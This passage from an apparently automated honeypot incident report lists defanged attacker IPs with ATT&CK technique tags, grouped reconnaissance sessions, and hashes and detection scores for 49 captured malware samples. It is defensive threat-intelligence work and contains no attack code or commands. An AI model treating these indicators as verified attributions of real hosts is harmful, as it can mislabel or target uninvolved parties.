| IR-380f8afd2537 | HIGH | `92.118.39[.]77` | 2026-10-18 09:08 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-3a53b544ec88 | HIGH | `83.168.110[.]192` | 2026-10-18 09:24 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f3c821e337a3 | HIGH | `83.168.110[.]192` | 2026-10-18 09:24 | Y | 0 | 0 | `T1078 · T1592` |
| IR-73c91e86ed07 | HIGH | `103.255.109[.]151` | 2026-10-18 09:28 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-9bbe6f1aa4b9 | HIGH | `103.255.109[.]151` | 2026-10-18 09:28 | Y | 0 | 0 | `T1078 · T1592` |
| IR-4d1fce86b762 | HIGH | `5.253.38[.]54` | 2026-10-18 09:37 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-be480c8f8953 | HIGH | `5.253.38[.]54` | 2026-10-18 09:37 | Y | 0 | 0 | `T1078 · T1592` |
| IR-db9e237b8ad9 | HIGH | `195.178.110[.]218` | 2026-10-18 10:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-ec76b856adee | HIGH | `92.118.39[.]77` | 2026-10-18 10:01 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-fb74a6a81d53 | HIGH | `2.57.122[.]238` | 2026-10-18 10:03 | Y | 1 | 0 | `T1078 · T1592` |
| IR-a91467362f93 | HIGH | `82.152.132[.]24` | 2026-10-18 10:13 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-2cfe20c35d15 | HIGH | `82.152.132[.]24` | 2026-10-18 10:13 | Y | 0 | 0 | `T1078 · T1592` |
| IR-147d996c343f | HIGH | `106.12.128[.]184` | 2026-10-18 10:16 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-dbbe3281ade9 | HIGH | `106.12.128[.]184` | 2026-10-18 10:16 | Y | 0 | 0 | `T1078 · T1592` |
| IR-7e9f32c6ec98 | HIGH | `165.154.255[.]63` | 2026-10-18 10:17 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-79ae0a1ae7ae | HIGH | `165.154.255[.]63` | 2026-10-18 10:17 | Y | 0 | 0 | `T1078 · T1592` |
| IR-52c4d7705b13 | HIGH | `176.53.159[.]196` | 2026-10-18 10:19 | Y | 0 | 0 | `T1078 · T1592` |
| IR-133a09aacbd3 | HIGH | `193.112.192[.]91` | 2026-10-18 10:28 | Y | 1 | 0 | `T1078 · T1592` |
| IR-822753ae0e42 | HIGH | `103.108.67[.]180` | 2026-10-18 10:29 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-3f5ec662567a | HIGH | `103.108.67[.]180` | 2026-10-18 10:29 | Y | 0 | 0 | `T1078 · T1592` |
| IR-030c060c154a | HIGH | `66.228.53[.]204` | 2026-10-18 10:32 | Y | 3 | 0 | `T1078` |
| IR-f8ff545b0ba9 | HIGH | `184.168.21[.]211` | 2026-10-18 10:34 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-ad3b86d1e932 | HIGH | `184.168.21[.]211` | 2026-10-18 10:34 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b44c811ed559 | HIGH | `88.249.195[.]23` | 2026-10-18 10:34 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-b568d51e5bdc | HIGH | `88.249.195[.]23` | 2026-10-18 10:34 | Y | 0 | 0 | `T1078 · T1592` |
| IR-969d3a9cf9e1 | HIGH | `209.99.190[.]186` | 2026-10-18 10:40 | Y | 1 | 0 | `T1078 · T1592` |
| IR-2a16b3ad8806 | HIGH | `165.1.75[.]106` | 2026-10-18 11:08 | Y | 0 | 0 | `T1078 · T1592` |
| IR-19b68dd03780 | HIGH | `165.1.75[.]106` | 2026-10-18 11:08 | Y | 7 | 0 | `T1059.004 · T1078 · T1105` |
| IR-baac858fcd59 | HIGH | `118.145.238[.]115` | 2026-10-18 11:15 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-9e5c9b5bccbc | HIGH | `103.248.120[.]6` | 2026-10-18 11:33 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-a6fbd5ea0775 | HIGH | `103.248.120[.]6` | 2026-10-18 11:33 | Y | 0 | 0 | `T1078 · T1592` |
| IR-02c87cbdbf91 | HIGH | `182.93.50[.]90` | 2026-10-18 11:33 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-1631bb1b05d1 | HIGH | `182.93.50[.]90` | 2026-10-18 11:33 | Y | 0 | 0 | `T1078 · T1592` |
| IR-17d3cc9b8f3b | HIGH | `193.112.192[.]91` | 2026-10-18 11:33 | Y | 0 | 0 | `T1078 · T1592` |
| IR-999cbe0594cb | HIGH | `45.117.177[.]47` | 2026-10-18 11:35 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-3520695ec772 | HIGH | `106.51.92[.]114` | 2026-10-18 11:35 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
_… 42 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `117.50.70[.]169` | **2** | 2026-10-18 11:38 | 2026-10-18 12:04 | 4m | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | **2** | 2026-10-18 11:09 | 2026-10-18 12:34 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **2** | 2026-10-18 07:43 | 2026-10-18 08:09 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]218` | **2** | 2026-10-18 07:01 | 2026-10-18 08:04 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `195.178.110[.]232` | **2** | 2026-10-18 11:57 | 2026-10-18 12:10 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `2.57.122[.]150` | **2** | 2026-10-18 06:49 | 2026-10-18 08:06 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `209.99.190[.]186` | **2** | 2026-10-18 11:59 | 2026-10-18 12:01 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `61.73.49[.]174` | **2** | 2026-10-18 03:52 | 2026-10-18 04:07 | 0m | 0 | `T1592` | 🟢 LOW |
| `64.34.94[.]207` | **2** | 2026-10-18 12:23 | 2026-10-18 14:12 | 2m | 2 | `T1110.001` | 🟢 LOW |
| `101.96.202[.]177` | 1 | 2026-10-18 02:44 | 2026-10-18 02:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `103.203.134[.]87` | 1 | 2026-10-18 05:15 | 2026-10-18 05:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `104.248.220[.]9` | 1 | 2026-10-18 11:38 | 2026-10-18 11:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `106.105.48[.]59` | 1 | 2026-10-18 07:45 | 2026-10-18 07:46 | 29s | 0 | `T1592` | 🟢 LOW |
| `106.12.127[.]250` | 1 | 2026-10-18 03:55 | 2026-10-18 03:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `109.104.176[.]16` | 1 | 2026-10-18 10:31 | 2026-10-18 10:31 | 10s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]111` | 1 | 2026-10-18 12:08 | 2026-10-18 12:08 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]30` | 1 | 2026-10-18 08:53 | 2026-10-18 08:53 | 8s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]48` | 1 | 2026-10-18 06:37 | 2026-10-18 06:38 | 8s | 0 | `T1592` | 🟢 LOW |
| `112.118.192[.]92` | 1 | 2026-10-18 08:58 | 2026-10-18 08:58 | 19s | 0 | `T1592` | 🟢 LOW |
| `112.118.192[.]92` | 1 | 2026-10-18 12:50 | 2026-10-18 12:50 | 20s | 0 | `T1592` | 🟢 LOW |
| `114.245.48[.]175` | 1 | 2026-10-18 09:49 | 2026-10-18 09:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `115.190.192[.]114` | 1 | 2026-10-18 12:00 | 2026-10-18 12:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.190.253[.]92` | 1 | 2026-10-18 11:38 | 2026-10-18 11:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `116.255.226[.]73` | 1 | 2026-10-18 04:48 | 2026-10-18 04:48 | 0s | 0 | `T1592` | 🟢 LOW |
| `116.49.193[.]202` | 1 | 2026-10-18 11:42 | 2026-10-18 11:42 | 27s | 0 | `T1592` | 🟢 LOW |
| `116.63.143[.]220` | 1 | 2026-10-18 05:14 | 2026-10-18 05:15 | 60s | 0 | `T1592` | 🟢 LOW |
| `117.50.119[.]132` | 1 | 2026-10-18 07:43 | 2026-10-18 07:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `118.145.238[.]115` | 1 | 2026-10-18 11:15 | 2026-10-18 11:17 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.47.77[.]183` | 1 | 2026-10-18 08:17 | 2026-10-18 08:17 | 15s | 0 | `T1592` | 🟢 LOW |
| `119.193.183[.]53` | 1 | 2026-10-18 07:46 | 2026-10-18 07:48 | 120s | 0 | `T1592` | 🟢 LOW |
| `119.93.221[.]255` | 1 | 2026-10-18 06:54 | 2026-10-18 06:55 | 28s | 0 | `T1592` | 🟢 LOW |
| `119.96.157[.]188` | 1 | 2026-10-18 08:54 | 2026-10-18 08:56 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.43.48[.]192` | 1 | 2026-10-18 01:51 | 2026-10-18 01:51 | 16s | 0 | `T1592` | 🟢 LOW |
| `120.48.136[.]241` | 1 | 2026-10-18 10:22 | 2026-10-18 10:24 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.44[.]127` | 1 | 2026-10-18 07:08 | 2026-10-18 07:10 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.161.117[.]30` | 1 | 2026-10-18 12:54 | 2026-10-18 12:55 | 24s | 0 | `T1592` | 🟢 LOW |
| `121.188.17[.]252` | 1 | 2026-10-18 02:45 | 2026-10-18 02:45 | 19s | 0 | `T1592` | 🟢 LOW |
| `121.204.150[.]212` | 1 | 2026-10-18 05:50 | 2026-10-18 05:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.61.88[.]136` | 1 | 2026-10-18 12:44 | 2026-10-18 12:44 | 12s | 0 | `T1592` | 🟢 LOW |
| `124.174.39[.]136` | 1 | 2026-10-18 04:26 | 2026-10-18 04:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `125.129.1[.]253` | 1 | 2026-10-18 03:09 | 2026-10-18 03:10 | 20s | 0 | `T1592` | 🟢 LOW |
| `125.142.253[.]123` | 1 | 2026-10-18 10:10 | 2026-10-18 10:10 | 23s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-18 01:09 | 2026-10-18 01:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-18 04:20 | 2026-10-18 04:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-18 07:19 | 2026-10-18 07:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.209[.]166` | 1 | 2026-10-18 06:55 | 2026-10-18 06:55 | 30s | 0 | `T1592` | 🟢 LOW |
| `136.244.50[.]79` | 1 | 2026-10-18 03:14 | 2026-10-18 03:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `139.196.103[.]75` | 1 | 2026-10-18 12:49 | 2026-10-18 12:50 | 50s | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | 1 | 2026-10-18 14:00 | 2026-10-18 14:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `139.59.147[.]123` | 1 | 2026-10-18 14:05 | 2026-10-18 14:05 | 0s | 0 | `T1592` | 🟢 LOW |
| `14.103.117[.]81` | 1 | 2026-10-18 03:55 | 2026-10-18 03:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `165.154.225[.]20` | 1 | 2026-10-18 13:27 | 2026-10-18 13:27 | 0s | 0 | `T1592` | 🟢 LOW |
| `165.227.57[.]193` | 1 | 2026-10-18 02:21 | 2026-10-18 02:21 | 0s | 0 | `T1592` | 🟢 LOW |
| `165.245.251[.]170` | 1 | 2026-10-18 06:50 | 2026-10-18 06:51 | 20s | 0 | `T1592` | 🟢 LOW |
| `167.71.59[.]170` | 1 | 2026-10-18 06:50 | 2026-10-18 06:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `170.231.236[.]98` | 1 | 2026-10-18 12:06 | 2026-10-18 12:06 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.104.208[.]137` | 1 | 2026-10-18 14:50 | 2026-10-18 14:51 | 31s | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]193` | 1 | 2026-10-18 04:09 | 2026-10-18 04:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]245` | 1 | 2026-10-18 09:09 | 2026-10-18 09:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `175.202.119[.]17` | 1 | 2026-10-18 06:13 | 2026-10-18 06:13 | 22s | 0 | `T1592` | 🟢 LOW |
| `178.132.198[.]200` | 1 | 2026-10-18 08:14 | 2026-10-18 08:14 | 16s | 0 | `T1592` | 🟢 LOW |
| `180.153.91[.]15` | 1 | 2026-10-18 02:28 | 2026-10-18 02:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.146[.]235` | 1 | 2026-10-18 09:33 | 2026-10-18 09:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.76.179[.]77` | 1 | 2026-10-18 10:27 | 2026-10-18 10:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `181.168.15[.]19` | 1 | 2026-10-18 14:13 | 2026-10-18 14:13 | 0s | 0 | `T1592` | 🟢 LOW |
| `181.209.97[.]188` | 1 | 2026-10-18 07:20 | 2026-10-18 07:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `183.106.66[.]113` | 1 | 2026-10-18 01:03 | 2026-10-18 01:04 | 30s | 0 | `T1592` | 🟢 LOW |
| `185.191.236[.]38` | 1 | 2026-10-18 10:30 | 2026-10-18 10:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.231.33[.]82` | 1 | 2026-10-18 03:03 | 2026-10-18 03:05 | 114s | 0 | `T1592` | 🟢 LOW |
| `188.240.59[.]22` | 1 | 2026-10-18 03:23 | 2026-10-18 03:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `188.240.59[.]45` | 1 | 2026-10-18 13:34 | 2026-10-18 13:34 | 9s | 0 | `T1592` | 🟢 LOW |
| `193.112.192[.]91` | 1 | 2026-10-18 10:29 | 2026-10-18 10:29 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `193.47.62[.]69` | 1 | 2026-10-18 13:03 | 2026-10-18 13:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.50.235[.]153` | 1 | 2026-10-18 08:51 | 2026-10-18 08:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]218` | 1 | 2026-10-18 10:05 | 2026-10-18 10:05 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `195.96.139[.]101` | 1 | 2026-10-18 04:46 | 2026-10-18 04:46 | 1s | 0 | `T1592` | 🟢 LOW |
| `2.51.137[.]26` | 1 | 2026-10-18 07:08 | 2026-10-18 07:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]238` | 1 | 2026-10-18 10:01 | 2026-10-18 10:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.65.146[.]34` | 1 | 2026-10-18 01:50 | 2026-10-18 01:50 | 9s | 0 | `T1592` | 🟢 LOW |
| `20.98.155[.]9` | 1 | 2026-10-18 12:59 | 2026-10-18 12:59 | 10s | 0 | `T1592` | 🟢 LOW |
| `200.59.89[.]115` | 1 | 2026-10-18 05:49 | 2026-10-18 05:49 | 10s | 0 | `T1592` | 🟢 LOW |
| `207.175.32[.]84` | 1 | 2026-10-18 07:22 | 2026-10-18 07:22 | 2s | 0 | `T1592` | 🟢 LOW |
| `209.38.205[.]0` | 1 | 2026-10-18 14:05 | 2026-10-18 14:05 | 20s | 0 | `T1592` | 🟢 LOW |
| `213.230.87[.]121` | 1 | 2026-10-18 14:31 | 2026-10-18 14:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `218.78.132[.]164` | 1 | 2026-10-18 14:51 | 2026-10-18 14:53 | 120s | 0 | `T1592` | 🟢 LOW |
| `218.90.138[.]78` | 1 | 2026-10-18 05:47 | 2026-10-18 05:49 | 120s | 0 | `T1592` | 🟢 LOW |
| `219.154.234[.]146` | 1 | 2026-10-18 13:45 | 2026-10-18 13:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `220.70.234[.]114` | 1 | 2026-10-18 08:56 | 2026-10-18 08:56 | 16s | 0 | `T1592` | 🟢 LOW |
| `221.124.94[.]188` | 1 | 2026-10-18 08:17 | 2026-10-18 08:17 | 8s | 0 | `T1592` | 🟢 LOW |
| `221.127.133[.]214` | 1 | 2026-10-18 14:08 | 2026-10-18 14:08 | 24s | 0 | `T1592` | 🟢 LOW |
| `221.149.43[.]154` | 1 | 2026-10-18 08:07 | 2026-10-18 08:07 | 30s | 0 | `T1592` | 🟢 LOW |
| `221.157.130[.]150` | 1 | 2026-10-18 11:07 | 2026-10-18 11:08 | 23s | 0 | `T1592` | 🟢 LOW |
| `222.103.201[.]40` | 1 | 2026-10-18 04:26 | 2026-10-18 04:26 | 24s | 0 | `T1592` | 🟢 LOW |
| `222.109.205[.]160` | 1 | 2026-10-18 02:59 | 2026-10-18 03:00 | 12s | 0 | `T1592` | 🟢 LOW |
| `223.83.183[.]254` | 1 | 2026-10-18 08:34 | 2026-10-18 08:36 | 120s | 0 | `T1592` | 🟢 LOW |
| `27.41.251[.]206` | 1 | 2026-10-18 01:29 | 2026-10-18 01:29 | 22s | 0 | `T1592` | 🟢 LOW |
| `3.129.187[.]38` | 1 | 2026-10-18 04:10 | 2026-10-18 04:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `31.14.254[.]108` | 1 | 2026-10-18 13:53 | 2026-10-18 13:53 | 9s | 0 | `T1592` | 🟢 LOW |
| `34.22.121[.]204` | 1 | 2026-10-18 07:57 | 2026-10-18 07:57 | 6s | 0 | `T1592` | 🟢 LOW |
| `34.62.245[.]73` | 1 | 2026-10-18 07:33 | 2026-10-18 07:33 | 3s | 0 | `T1592` | 🟢 LOW |
| `34.77.30[.]113` | 1 | 2026-10-18 05:10 | 2026-10-18 05:10 | 6s | 0 | `T1592` | 🟢 LOW |
| `34.78.78[.]193` | 1 | 2026-10-18 05:12 | 2026-10-18 05:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `36.141.93[.]74` | 1 | 2026-10-18 08:55 | 2026-10-18 08:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `36.50.134[.]86` | 1 | 2026-10-18 07:50 | 2026-10-18 07:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `40.124.178[.]103` | 1 | 2026-10-18 05:45 | 2026-10-18 05:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `40.124.186[.]136` | 1 | 2026-10-18 12:23 | 2026-10-18 12:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `44.203.188[.]7` | 1 | 2026-10-18 01:26 | 2026-10-18 01:26 | 2s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]141` | 1 | 2026-10-18 04:04 | 2026-10-18 04:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]61` | 1 | 2026-10-18 08:50 | 2026-10-18 08:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.77.61[.]56` | 1 | 2026-10-18 04:04 | 2026-10-18 04:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.173.96[.]208` | 1 | 2026-10-18 05:43 | 2026-10-18 05:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.200.54[.]223` | 1 | 2026-10-18 04:04 | 2026-10-18 04:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `47.254.151[.]194` | 1 | 2026-10-18 04:34 | 2026-10-18 04:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `5.226.140[.]50` | 1 | 2026-10-18 03:23 | 2026-10-18 03:23 | 10s | 0 | `T1592` | 🟢 LOW |
| `50.80.127[.]207` | 1 | 2026-10-18 04:53 | 2026-10-18 04:53 | 17s | 0 | `T1592` | 🟢 LOW |
| `51.158.205[.]203` | 1 | 2026-10-18 10:47 | 2026-10-18 10:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `52.248.43[.]11` | 1 | 2026-10-18 14:44 | 2026-10-18 14:44 | 10s | 0 | `T1592` | 🟢 LOW |
| `58.151.173[.]28` | 1 | 2026-10-18 05:38 | 2026-10-18 05:38 | 30s | 0 | `T1592` | 🟢 LOW |
| `58.221.60[.]25` | 1 | 2026-10-18 07:06 | 2026-10-18 07:08 | 120s | 0 | `T1592` | 🟢 LOW |
| `59.6.18[.]50` | 1 | 2026-10-18 08:25 | 2026-10-18 08:25 | 24s | 0 | `T1592` | 🟢 LOW |
| `60.188.249[.]64` | 1 | 2026-10-18 00:57 | 2026-10-18 00:57 | 8s | 0 | `T1592` | 🟢 LOW |
| `64.205.72[.]141` | 1 | 2026-10-18 13:52 | 2026-10-18 13:52 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.205.72[.]155` | 1 | 2026-10-18 06:40 | 2026-10-18 06:40 | 9s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]108` | 1 | 2026-10-18 06:54 | 2026-10-18 06:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]152` | 1 | 2026-10-18 01:43 | 2026-10-18 01:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]122` | 1 | 2026-10-18 06:47 | 2026-10-18 06:47 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]30` | 1 | 2026-10-18 06:24 | 2026-10-18 06:24 | 4s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]48` | 1 | 2026-10-18 06:23 | 2026-10-18 06:23 | 2s | 0 | `T1592` | 🟢 LOW |
| `65.185.8[.]48` | 1 | 2026-10-18 05:28 | 2026-10-18 05:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]106` | 1 | 2026-10-18 07:59 | 2026-10-18 07:59 | 19s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]162` | 1 | 2026-10-18 08:00 | 2026-10-18 08:00 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]119` | 1 | 2026-10-18 07:59 | 2026-10-18 07:59 | 1s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]38` | 1 | 2026-10-18 08:00 | 2026-10-18 08:01 | 22s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]43` | 1 | 2026-10-18 05:50 | 2026-10-18 05:50 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]87` | 1 | 2026-10-18 12:57 | 2026-10-18 12:57 | 3s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]95` | 1 | 2026-10-18 08:01 | 2026-10-18 08:01 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.224[.]226` | 1 | 2026-10-18 04:50 | 2026-10-18 04:51 | 5s | 0 | `T1592` | 🟢 LOW |
| `66.228.53[.]204` | 1 | 2026-10-18 10:32 | 2026-10-18 10:32 | 0s | 0 | `T1592` | 🟢 LOW |
| `67.167.41[.]67` | 1 | 2026-10-18 05:30 | 2026-10-18 05:30 | 0s | 0 | `T1592` | 🟢 LOW |
| `69.5.169[.]24` | 1 | 2026-10-18 11:44 | 2026-10-18 11:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `70.34.202[.]108` | 1 | 2026-10-18 03:47 | 2026-10-18 03:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `70.34.202[.]108` | 1 | 2026-10-18 11:03 | 2026-10-18 11:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `70.34.202[.]108` | 1 | 2026-10-18 14:35 | 2026-10-18 14:35 | 1s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-18 09:04 | 2026-10-18 09:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-18 12:23 | 2026-10-18 12:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.67.26[.]129` | 1 | 2026-10-18 06:40 | 2026-10-18 06:40 | 9s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | 1 | 2026-10-18 08:08 | 2026-10-18 08:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `78.128.114[.]118` | 1 | 2026-10-18 03:03 | 2026-10-18 03:03 | 1s | 0 | `T1592` | 🟢 LOW |
| `80.241.241[.]170` | 1 | 2026-10-18 11:33 | 2026-10-18 11:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `81.102.131[.]25` | 1 | 2026-10-18 13:56 | 2026-10-18 13:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `81.19.216[.]110` | 1 | 2026-10-18 13:33 | 2026-10-18 13:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `84.54.71[.]17` | 1 | 2026-10-18 09:20 | 2026-10-18 09:20 | 13s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]5` | 1 | 2026-10-18 08:28 | 2026-10-18 08:28 | 0s | 0 | `T1592` | 🟢 LOW |
| `86.127.235[.]148` | 1 | 2026-10-18 12:04 | 2026-10-18 12:06 | 120s | 0 | `T1592` | 🟢 LOW |
| `89.21.67[.]176` | 1 | 2026-10-18 08:51 | 2026-10-18 08:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]49` | 1 | 2026-10-18 02:19 | 2026-10-18 02:20 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `92.118.39[.]77` | 1 | 2026-10-18 03:08 | 2026-10-18 03:08 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `92.118.39[.]77` | 1 | 2026-10-18 09:18 | 2026-10-18 09:18 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `93.227.159[.]228` | 1 | 2026-10-18 08:02 | 2026-10-18 08:02 | 12s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `0056cc09cf81211b753d79839e3399935a2aa6dd0217232a294f3953b9a7fc26` | ELF Binary (Linux executable) (AArch64 64-bit) | `0056cc09cf81211b...` | 30/100 | 🟢 LOW | **2/75** 🔴 |
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `026cc4f630776e0c9d42905bf3e9b048fda4da68d58c66e4a2e5bb3d8a9d787c` | ELF Binary (Linux executable) (x86-64 64-bit) | `026cc4f630776e0c...` | 31/100 | 🟢 LOW | **4/75** 🔴 |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `05af569c3595b01e0724bc96c989105467952fd22a8681a716cfa22ec070d78c` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `05af569c3595b01e...` | 84/100 | 🔴 HIGH | **37/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
